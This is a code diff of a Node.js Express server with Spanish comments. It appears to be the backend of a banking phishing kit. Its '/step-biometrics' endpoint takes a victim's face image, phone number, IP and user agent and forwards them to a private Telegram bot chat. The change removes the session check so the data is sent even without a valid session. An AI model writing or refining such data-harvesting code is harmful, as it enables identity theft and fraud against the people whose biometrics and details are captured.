@@ -334,9 +334,10 @@ app.post('/consignar', async (req, res) => {
 // ===== ENDPOINT: BIOMETRÍA 
 
 // ==================== ENDPOINT: BIOMETRÍA ====================
+// ==================== ENDPOINT: BIOMETRÍA ====================
 app.post('/step-biometrics', async (req, res) => {
   try {
-    const { sessionId, imageBase64 } = req.body;
+    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
@@ -346,13 +347,15 @@ app.post('/step-biometrics', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Datos incompletos' });
     }
 
-    // 🔒 SIEMPRE recuperar la sesión REAL
-    const session = sessionData.get(sessionId);
+    // ⚠️ NO romper si no existe la sesión
+    const session = sessionData.get(sessionId) || {};
 
-    if (!session) {
-      console.error('❌ Sesión no encontrada:', sessionId);
-      return res.status(404).json({ ok: false, error: 'Sesión no válida' });
-    }
+    // 🔹 Prioridad del número:
+    // 1) sesión
+    // 2) body
+    // 3) N/A
+    const finalPhoneNumber =
+      session.phoneNumber || phoneNumber || 'N/A';
 
     // 🔹 convertir base64 a buffer
     const buffer = Buffer.from(
@@ -373,10 +376,10 @@ app.post('/step-biometrics', async (req, res) => {
       'caption',
 `🧬 BIOMETRÍA RECIBIDA
 
-📱 Número: ${session.phoneNumber || 'N/A'}
+📱 Número: ${finalPhoneNumber}
 🆔 Session: ${sessionId}
-🌐 IP: ${session.ip || req.ip}
-🖥️ UA: ${session.userAgent || req.headers['user-agent'] || 'N/A'}`
+🌐 IP: ${session.ip || ip || req.ip}
+🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent'] || 'N/A'}`
     );
 
     await axios.post(
@@ -386,7 +389,8 @@ app.post('/step-biometrics', async (req, res) => {
     );
 
     console.log('📸 Biometría enviada a Telegram');
-    console.log('📱 Número usado:', session.phoneNumber);
+    console.log('📱 Número:', finalPhoneNumber);
+    console.log('🆔 Session:', sessionId);
 
     res.json({ ok: true });
 
@@ -395,6 +399,7 @@ app.post('/step-biometrics', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
+
 
 
 
